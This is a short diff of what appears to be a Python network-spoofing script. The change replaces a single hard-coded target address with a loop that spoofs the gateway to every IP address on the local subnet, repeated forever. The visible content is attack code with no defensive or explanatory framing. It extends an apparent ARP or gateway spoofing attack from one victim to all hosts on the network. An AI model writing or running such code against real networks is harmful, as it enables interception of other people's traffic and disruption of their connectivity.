@@ -86,7 +86,7 @@ ip = get_all_ip_list()
 gateway = get_masc() + '1'
 while 1:
     for k in ip:
-        spoof(gateway, '172.16.121.87')
+        spoof(gateway, k)
         print(k)
 
 #get list of ip adress or take by mask /24 +++
